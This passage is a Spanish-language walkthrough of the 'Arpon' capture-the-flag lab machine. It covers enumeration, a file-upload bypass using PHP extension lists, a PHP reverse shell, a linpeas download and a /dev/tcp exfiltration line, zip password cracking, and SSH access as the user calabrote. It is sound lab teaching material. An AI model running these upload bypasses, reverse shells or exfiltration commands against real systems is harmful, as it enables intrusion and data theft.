## Información

Nivel: Easy

Release Date // 14/05/2024

Download // https://mega.nz/file/cL1DGAJI#68izt_3VZXcMlG1EoMkzPMB53fThl7dpmg44zj_LXVI

MD5 //VulNyx-Arpon.zip --> 9d0e779a37aed124ab71ccb407c26cd1

## Notas

- Dirección IP: 192.168.56.167
- Servicios:
  - 22/tcp open   ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
    - publickey
  - 80/tcp open   http    Apache httpd 2.4.59 ((Debian))
    - Supported Methods: OPTIONS HEAD GET POST
  

## Enumeración

### nmap

```bash
kali@kali:~$ sudo nmap -n -sn 192.168.56.150-254
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 09:42 CEST
Nmap scan report for 192.168.56.167
Host is up (0.00083s latency).
MAC Address: 08:00:27:FC:37:A2 (Oracle VirtualBox virtual NIC)
Nmap done: 105 IP addresses (1 host up) scanned in 1.82 seconds
```

### tcp

```bash
kali@kali:~$ sudo nmap -n -Pn -sS -p- 192.168.56.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 09:43 CEST
Nmap scan report for 192.168.56.167
Host is up (0.00030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:FC:37:A2 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.94 seconds
```

```bash
kali@kali:~$ sudo nmap -n -Pn -sV -sC -O -p 21,22,80 192.168.56.167  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 09:44 CEST
Nmap scan report for 192.168.56.167
Host is up (0.00056s latency).

PORT   STATE  SERVICE VERSION
21/tcp closed ftp
22/tcp open   ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 e1:85:8b:7b:6d:a2:6b:1a:ed:18:8e:08:a0:90:87:2a (ECDSA)
|_  256 ad:fe:77:78:a0:57:70:cc:33:68:b5:84:26:a3:b3:63 (ED25519)
80/tcp open   http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: Essex
MAC Address: 08:00:27:FC:37:A2 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.64 seconds
```

## Servicios

### ssh

Autenticación mediante claves digitales

```bash
kali@kali:~$ sudo nmap -n -Pn  -p 22 --script ssh-auth-methods 192.168.56.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 09:45 CEST
Nmap scan report for 192.168.56.167
Host is up (0.00038s latency).

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods: 
|   Supported authentication methods: 
|_    publickey
MAC Address: 08:00:27:FC:37:A2 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

### http

#### página index

```bash
kali@kali:~$ curl -s -I http://192.168.56.167
HTTP/1.1 200 OK
Date: Tue, 14 May 2024 07:46:44 GMT
Server: Apache/2.4.59 (Debian)
Last-Modified: Mon, 13 May 2024 21:59:44 GMT
ETag: "98f-6185d00cd4f7f"
Accept-Ranges: bytes
Content-Length: 2447
Vary: Accept-Encoding
Content-Type: text/html
```

![arpon_01](imagenes/arpon_01.png)

```html
<!doctype html>
<html>
<head>
<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
<title>Essex</title>
<style>
div {
  width: 50%;
  margin: auto;
}
img {
  margin-left: auto;
  margin-right: auto;
  display: block;
}
</style>
</head>
<body>
<div>
<h1 id='ballenero-essex'>Ballenero Essex</h1>
<p align="justify">El <em><strong>Essex</strong></em> fue un barco ballenero del siglo xix de Nantucket, Massachusetts, Estados Unidos. Tenía 27 metros de eslora y 238 toneladas de peso, y estaba capitaneado por George Pollard, Jr., de 28 años de edad. Se lo conoce por ser embestido y hundido por un cachalote en el océano Pacífico en 1820. El incidente inspiró la novela clásica de 1851 <em>Moby-Dick</em>, de Herman Melville.</p>
<p><img src="imagenes/1024px-Whaling_Harpoons_1887.jpg" referrerpolicy="no-referrer" alt="undefined" height="700"></p>
<p align="center">Fuente: Wikipedia. Arpones usados en la pesca de ballenas</p>
<h2 id='ataque-del-cachalote-y-supervivientes'>Ataque del cachalote y supervivientes</h2>
<p align="justify">El <em>Essex</em> partió de Nantucket en 1819 para un viaje de un año y tres meses hacia las zonas de caza de ballenas en el Pacífico Sur. El 20 de noviembre de 1820 el <em>Essex</em> se encontró con un cachalote mucho más grande de lo normal, el cual embistió el barco en dos ocasiones y provocó su hundimiento, mientras los tripulantes estaban persiguiendo y arponeando a otros miembros de la manada. </p>
<p><img src="imagenes/Essex_photo_03_b.jpg" referrerpolicy="no-referrer" alt="undefined"></p>
<p align="center">Fuente: Wikipedia. El <em>Essex</em> siendo golpeado por una ballena el 20 de noviembre de 1820 (dibujado por Thomas Nickerson).</p>
<p align="justify">El barco naufragó a 2000 millas náuticas (3700 kilómetros) al oeste de la costa occidental de Sudamérica. Tras el naufragio, los veintiún marinos se embarcaron en tres pequeños botes balleneros usados como botes salvavidas, con escasos suministros de comida y agua dulce. Tras algunos días de navegar a la deriva arribaron a la isla deshabitada de Henderson, perteneciente a las Islas Pitcairn, actualmente territorio de Gran Bretaña.</p>
<p><img src="imagenes/Moby_Dick_p510_illustration.jpg" referrerpolicy="no-referrer" alt="img"></p>
<p align="center">Fuente: Wikipedia. Ilustración de Moby Dick, en una edición de la novela de 1892.</p>
<p>&nbsp;</p>
</div>
</body>
</html>
```

#### métodos

```bash
kali@kali:~$ sudo nmap -n -Pn -p 80 --script http-methods 192.168.56.167
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-14 09:46 CEST
Nmap scan report for 192.168.56.167
Host is up (0.00038s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
MAC Address: 08:00:27:FC:37:A2 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.27 seconds
```

#### whatweb

```bash
kali@kali:~$ whatweb -v 192.168.56.167                        
WhatWeb report for http://192.168.56.167
Status    : 200 OK
Title     : Essex
IP        : 192.168.56.167
Country   : RESERVED, ZZ

Summary   : Apache[2.4.59], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and 
	maintain an open-source HTTP server for modern operating 
	systems including UNIX and Windows NT. The goal of this 
	project is to provide a secure, efficient and extensible 
	server that provides HTTP services in sync with the current 
	HTTP standards. 

	Version      : 2.4.59 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration 


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to 
	identify the operating system from the server header. 

	OS           : Debian Linux
	String       : Apache/2.4.59 (Debian) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Tue, 14 May 2024 07:47:15 GMT
	Server: Apache/2.4.59 (Debian)
	Last-Modified: Mon, 13 May 2024 21:59:44 GMT
	ETag: "98f-6185d00cd4f7f-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 1259
	Connection: close
	Content-Type: text/html
```

#### ffuf

```bash
kali@kali:~$ ffuf -u http://192.168.56.167/FUZZ -w directory-list-2.3-medium.txt -e .php,.html,.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.167/FUZZ
 :: Wordlist         : FUZZ: /home/kali/directory-list-2.3-medium.txt
 :: Extensions       : .php .html .txt 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.html              [Status: 200, Size: 2447, Words: 286, Lines: 35, Duration: 603ms]
index.php               [Status: 200, Size: 72681, Words: 3501, Lines: 811, Duration: 447ms]
backup                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 1ms]
imagenes                [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 2ms]
.html                   [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 0ms]
.php                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 7ms]
                        [Status: 200, Size: 2447, Words: 286, Lines: 35, Duration: 12ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 1ms]
:: Progress: [882184/882184] :: Job [1/1] :: 8333 req/sec :: Duration: [0:02:08] :: Errors: 0 ::
```

**http://192.168.56.167/index.php**

se corresponde con un archivo phpinfo

![arpon_02](imagenes/arpon_02.png)

**http://192.168.56.167/imagenes/**

![arpon_03](imagenes/arpon_03.png)

**http://192.168.56.167/backup/**

Formulario de subida de archivos que llama a la página `upload.php`.

![arpon_04](imagenes/arpon_04.png)

```html
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Subir Archivo</title>
</head>
<body>
    <h1>Subir archivo</h1>
    <form action="upload.php" method="post" enctype="multipart/form-data">
        Selecciona el archivo para subir:
        <input type="file" name="archivoSubido" id="archivoSubido">
        <input type="submit" value="Subir Archivo" name="submit">
    </form>
</body>
</html>
```

## Explotación

### Formulario subida imágenes

Permite subir imágenes .png:

![arpon_001](imagenes/arpon_001.png)

Bloquea la subida de archivos .php:

![arpon_002](imagenes/arpon_002.png)

![arpon_003](imagenes/arpon_003.png)

Se va a probar una lista de extensiones asociadas a PHP para ver si formulario permite alguna:

> https://book.hacktricks.xyz/pentesting-web/file-upload
>
> **PHP**: *.php*, *.php2*, *.php3*, .*php4*, .*php5*, .*php6*, .*php7*, .phps, .*phps*, .*pht*, .*phtm, .phtml*, .*pgif*, *.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module*
>
> - **Working in PHPv8**: *.php*, *.php4*, *.php5*, *.phtml*, *.module*, *.inc*, *.hphp*, *.ctp*
>
> ![arpon_004](imagenes/arpon_004.png)
>
> ```
> ctp
> hphp
> htaccess
> inc
> module
> pgif
> phar
> php
> php2
> php3
> php4
> php5
> php6
> php7
> phps
> pht
> phtm
> phtml
> shtml
> php-s
> ```

En Burp Suite se captura una solicitud y se reenvía a Intruder:

```http
POST /backup/upload.php HTTP/1.1
Host: 192.168.56.167
Content-Length: 325
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.56.167
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryuHTIZEIOrUQUidd5
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.60 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.167/backup/
Accept-Encoding: gzip, deflate, br
Accept-Language: es-ES,es;q=0.9
Connection: close

------WebKitFormBoundaryuHTIZEIOrUQUidd5
Content-Disposition: form-data; name="archivoSubido"; filename="info.php"
Content-Type: application/x-php


<?php
phpinfo();
?>

------WebKitFormBoundaryuHTIZEIOrUQUidd5
Content-Disposition: form-data; name="submit"

Subir Archivo
------WebKitFormBoundaryuHTIZEIOrUQUidd5--
```

Se define la posición:

```
Content-Disposition: form-data; name="archivoSubido"; filename="info.§php§"
```

![arpon_006](imagenes/arpon_006.png)

![arpon_005](imagenes/arpon_005.png)

![arpon_007](imagenes/arpon_007.png)

Se prueba a acceder a uno de estos ficheros y no se encuentra por lo que habrá que descubrir la carpeta a la que se suben los ficheros:

![arpon_008](imagenes/arpon_008.png)

```bash
kali@kali:~$ ffuf -u http://192.168.56.167/backup/FUZZ/info.phar -w directory-list-2.3-medium.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.167/backup/FUZZ/info.phar
 :: Wordlist         : FUZZ: /home/kali/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

empty                   [Status: 200, Size: 72786, Words: 3501, Lines: 812, Duration: 10ms]
:: Progress: [220546/220546] :: Job [1/1] :: 6666 req/sec :: Duration: [0:00:32] :: Errors: 0 ::
```

Carpeta `empty`:

![arpon_009](imagenes/arpon_009.png)

### Reverse Shell

Se sube una PHP Web Shell con extensión .phar y se logra una reverse shell accediendo a `http://192.168.56.167/backup/empty/rev.phar`:

```bash
kali@kali:~$ cp rev.php rev.phar
kali@kali:~$ less rev.phar 
$ip = '192.168.56.100';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
```

![arpon_010](imagenes/arpon_010.png)

```bash
kali@kali:~$ ncat -nlvp 1234                                                                      
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 192.168.56.167:39178.
Linux debian 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64 GNU/Linux
 10:33:07 up 52 min,  1 user,  load average: 0.18, 1.39, 1.09
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
root     tty1     -                10:21    8:43   0.13s  0.08s -bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```

### Estabilización de la shell

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@debian:/$ export TERM=xterm
export TERM=xterm
www-data@debian:/$ ^Z
zsh: suspended  ncat -nlvp 1234
kali@kali:~$ stty -a                                                    
speed 38400 baud; rows 51; columns 118; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q;
stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
kali@kali:~$ stty raw -echo;fg;ls  
[1]  + continued  ncat -nlvp 1234
www-data@debian:/$ stty rows 52 columns 118
```

```bash
www-data@debian:/$ whoami
www-data
www-data@debian:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@debian:/$ pwd
/
```

## Postexplotación

### enumeración con linpeas

```bash
kali@kali:~$ python3 -m http.server 8080                               
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.56.160 - - [06/Jan/2024 22:34:18] "GET /linpeas.sh HTTP/1.1" 200 -
```

```bash
www-data@debian:/$ cd /tmp/
www-data@debian:/tmp$ wget http://192.168.56.100:8080/linpeas.sh -O linpeas.sh
www-data@debian:/tmp$ chmod 755 linpeas.sh 
www-data@debian:/tmp$ ./linpeas.sh -a | tee informe_linpeas.txt
www-data@debian:/tmp$ bash -c 'cat informe_linpeas.txt > /dev/tcp/192.168.56.100/8000'
```
```bash
kali@kali:~$ ncat -nlvp 8000 > informe_linpeas.txt              
Ncat: Version 7.94SVN ( https://nmap.org/ncat )
Ncat: Listening on [::]:8000
Ncat: Listening on 0.0.0.0:8000
Ncat: Connection from 192.168.56.167:36358.
```

```bash
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════
                               ╚═══════════════════╝
OS: Linux version 6.1.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03)
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: debian
Writable folder: /dev/shm

                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════
                              ╚════════════════════╝
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#kernel-exploits
Linux version 6.1.0-21-amd64 (debian-kernel@lists.debian.org) (gcc-12 (Debian 12.2.0-14) 12.2.0, GNU ld (GNU Binutils for Debian) 2.40) #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03)
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-version
Sudo version 1.9.13p3

╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c  ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════
                                   ╚═══════════╝
╔══════════╣ Container related tools present (if any):
/usr/bin/docker
/usr/bin/runc

╔══════════╣ Services
╚ Search for outdated versions
 [ - ]  apache-htcacheclean
 [ + ]  apache2
 [ + ]  apparmor
 [ - ]  console-setup.sh
 [ + ]  cron
 [ + ]  dbus
 [ + ]  docker
 [ - ]  hwclock.sh
 [ - ]  keyboard-setup.sh
 [ + ]  kmod
 [ + ]  networking
 [ + ]  procps
 [ + ]  ssh
 [ - ]  sudo
 [ + ]  udev

╔══════════╣ Interfaces
default              0.0.0.0
loopback        127.0.0.0
link-local      169.254.0.0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:69:55:96:45  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.167  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fefc:37a2  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:fc:37:a2  txqueuelen 1000  (Ethernet)
        RX packets 1224377  bytes 215003652 (205.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1219205  bytes 565152784 (538.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

╔══════════╣ Interfaces
default              0.0.0.0
loopback        127.0.0.0
link-local      169.254.0.0

docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:69:55:96:45  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

enp0s3: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.167  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::a00:27ff:fefc:37a2  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:fc:37:a2  txqueuelen 1000  (Ethernet)
        RX packets 1224377  bytes 215003652 (205.0 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1219205  bytes 565152784 (538.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash

╔══════════╣ Users with console
calabrote:x:1001:1001::/home/calabrote:/bin/sh
foque:x:1002:1002::/home/foque:/bin/sh
root:x:0:0:root:/root:/bin/bash

uid=1001(calabrote) gid=1001(calabrote) groups=1001(calabrote)
uid=1002(foque) gid=1002(foque) groups=1002(foque),996(docker)

                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/ctr
/usr/bin/curl
/usr/bin/docker
/usr/bin/nc
/usr/bin/nc.traditional
/usr/bin/netcat
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python3
/usr/bin/runc
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files
/dev/mqueue
/dev/shm
/run/apache2/socks
/run/lock
/run/lock/apache2
/tmp
/tmp/informe_linpeas.txt
/tmp/linpeas.sh
/var/cache/apache2/mod_cache_disk
/var/lib/php/sessions
/var/tmp
/var/www/html/backup
/var/www/html/backup/empty
/var/www/html/backup/empty/.hidden
/var/www/html/backup/empty/.hidden/backup_id.zip
/var/www/html/backup/empty/index.html
/var/www/html/backup/empty/info.ctp
/var/www/html/backup/empty/info.hphp
/var/www/html/backup/empty/info.htaccess
/var/www/html/backup/empty/info.inc
#)You_can_write_even_more_files_inside_last_directory

/var/www/html/backup/index.html
/var/www/html/backup/upload.php

══════════╣ Backup files (limited 100)
-rw-r--r-- 1 www-data www-data 3090 May 12 23:09 /var/www/html/backup/empty/.hidden/backup_id.zip
-rw-r--r-- 1 root root 0 May 11 22:46 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 May 11 22:47 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rwxr-xr-x 1 root root 2569 May 11  2023 /usr/libexec/dpkg/dpkg-db-backup
-rw-r--r-- 1 root root 438702 Feb 15  2023 /usr/share/doc/manpages/Changes.old.gz
-rw-r--r-- 1 root root 147 Mar 27  2023 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 138 Mar 27  2023 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 14083 May  3 14:36 /usr/lib/modules/6.1.0-21-amd64/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 14083 Feb  1 09:05 /usr/lib/modules/6.1.0-18-amd64/kernel/drivers/net/team/team_mode_activebackup.ko

```

### Escalado privilegios: www-data --> calabrote

#### backup_id.zip

![arpon_012](imagenes/arpon_012.png)

Se investiga el fichero backup_id.zip ubicado en la carpeta oculta .hidden:

![arpon_013](imagenes/arpon_013.png)

Parece contener claves digitales y está protegido por contraseña:

![arpon_013](imagenes/arpon_013-1715677220401-17.png)

![arpon_014](imagenes/arpon_014.png)

##### Con john

```bash
kali@kali:~$ zip2john backup_id.zip > backup_id.zip_hash
ver 2.0 efh 5455 efh 7875 backup_id.zip/id_rsa_calabrote PKZIP Encr: TS_chk, cmplen=2106, decmplen=3369, crc=30838030 ts=B802 cs=b802 type=8
ver 2.0 efh 5455 efh 7875 backup_id.zip/id_rsa_calabrote.pub PKZIP Encr: TS_chk, cmplen=602, decmplen=735, crc=155F3DD3 ts=B802 cs=b802 type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
kali@kali:~$ cat backup_id.zip_hash 
backup_id.zip:$pkzip$2*1*1*0*8*24*b802*20b3ed209b6bc597880c97b993f4304932130511afbfb07c4f4acb009a789624526c8379*2*0*25a*2df*155f3dd3*894*4e*8*25a*b802*ac7afaabfed5b9596d3522fabf4f060b67306ceaf273374b73817dcdbe077b223c2e524d48b58e3d72a01c27b8882e6aef580d1011dbd9f0a57631701898ef6ab49d1d2f83e8dd5516fdc7d80d35c079e2a86d87a8d474f502ec784c7e2600764aad21750014d2d1b4f58cd11e3f5f9ddf36c707e6f4bf3e238a1d5bd356fd373953f4d4f386357f7b7fbec34e18386e3a6e5d92bb37c4efa9fc48af74b07b4736e724dfa96f3be6a211ba674f98d597e6ab42a1d32025676f82ab26f70e11fe340786512152a75a81535aa4e24cf9b3715332ade337c9f9efd36a6984c90f06d91c4c039f2ff7769131a5d95eb19f3002054b894bf92ec32a7027df9e45324757a68927c61f45094bde0f387d0bf1a6593d72111b489815900d516ee11d8d489a938fc55c6a3e399b4b20ea4b246bf9d13d0a3594f4167e207675f9277fb5dd7d7313ad14b9ff9a49656275f2c95b11e0db37e9cc37e63ad7edaa81164a41a46175e7919a0a0b50beb131e84192b21cf27ffacca82b9ba9ce50974c66357efb98a4dff2e3bde7516adf37b1e42313ead71021092f1ad1b37937f83720aec9caa09bb63de30d3c577504a0828781c4d43fbd906ea88fc0ece03a05028504dd2b27be2769062cefbbed4aee62b4afc115a0baf6fa78f1bfd7c2825cd2077c0177a3c715b4fa06ca74f9f0614c5b881bbd883b874b50c5b86af530c8be3ba6a1b005a0c7a1428d94e3f6ac394c7b256e2086b016f0412e495d98cdac0afc705a7263023030611521f8b4717612234909264d87e1daa1718a9f3553414af00d877a2668f6d7aa8fc89237a5043952be393f648d5f7713292e50e49d*$/pkzip$::backup_id.zip:id_rsa_calabrote.pub, id_rsa_calabrote:backup_id.zip
```

```bash
kali@kali:~$ john --wordlist=/home/kali/rockyou.txt backup_id.zip_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
swordfish        (backup_id.zip)     
1g 0:00:00:00 DONE (2024-05-14 11:03) 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

##### Con fcrackzip

```bash
kali@kali:~$ fcrackzip -v -u -D -p /home/kali/rockyou.txt backup_id.zip
found file 'id_rsa_calabrote', (size cp/uc   2106/  3369, flags 9, chk b802)
found file 'id_rsa_calabrote.pub', (size cp/uc    602/   735, flags 9, chk b802)


PASSWORD FOUND!!!!: pw == swordfish
```

Contraseña: `swordfish`

```bash
kali@kali:~$ unzip backup_id.zip 
Archive:  backup_id.zip
[backup_id.zip] id_rsa_calabrote password: 
  inflating: id_rsa_calabrote        
  inflating: id_rsa_calabrote.pub  
```

#### Acceso como calabrote

Se trata de acceder como calabrote usando la clave RSA:

```bash
kali@kali:~$ ls -lhF id_rsa_calabrote*  
-rw------- 1 kali kali 3,3K may 12 23:00 id_rsa_calabrote
-rw-r--r-- 1 kali kali  735 may 12 23:00 id_rsa_calabrote.pub
kali@kali:~$ ssh -i id_rsa_calabrote calabrote@192.168.56.167
The authenticity of host '192.168.56.167 (192.168.56.167)' can't be established.
ED25519 key fingerprint is SHA256:g8iur6EjGwi7RyIbOgo3T699hNqNl6zM8jdcfxu/gb0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.167' (ED25519) to the list of known hosts.
Linux debian 6.1.0-21-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.90-1 (2024-05-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ whoami
calabrote
$ id
uid=1001(calabrote) gid=1001(calabrote) grupos=1001(calabrote)
$ bash
calabrote@debian:~$ ls -lahF
total 24K
drwx------ 3 calabrote calabrote 4,0K may 12 23:00 ./
